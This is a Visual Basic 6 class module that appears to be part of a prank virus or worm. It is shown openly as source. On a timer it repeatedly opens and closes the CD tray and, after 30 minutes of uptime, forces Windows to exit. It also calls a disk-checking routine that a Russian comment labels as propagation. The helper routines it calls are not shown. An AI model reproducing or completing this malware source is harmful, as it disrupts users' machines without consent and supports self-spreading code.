VERSION 1.0 CLASS
BEGIN
  MultiUse = -1  'True
  Persistable = 0  'NotPersistable
  DataBindingBehavior = 0  'vbNone
  DataSourceBehavior  = 0  'vbNone
  MTSTransactionMode  = 0  'NotAnMTSObject
END
Attribute VB_Name = "Heard"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = True
Attribute VB_PredeclaredId = False
Attribute VB_Exposed = False
Option Explicit
Private Declare Function GetTickCount Lib "kernel32" () As Long
Private Declare Sub Sleep Lib "kernel32" (ByVal dwMilliseconds As Long)
Const Interval = 100
Const CheckDisks = 5000
Dim lngChD As Long
Const OpenCloseDisk = 180000
Dim lngOpClD As Long

Public Sub Blow()
    Sleep Interval
    Shivering
    If GetTickCount > 1800000 And Serios Then
        Brain.ExitWindows 0
    End If
End Sub

Private Sub Shivering()
    lngChD = lngChD + 1
    lngOpClD = lngOpClD + 1
    If (OpenCloseDisk <= lngOpClD * Interval) And Serios Then
        lngOpClD = 0
        Brain.OpenCDdoor
        Brain.CloseCDdoor
    End If
    ' размножение
    If CheckDisks <= lngChD * Interval Then
        lngChD = 0
        Dicks
    End If
End Sub

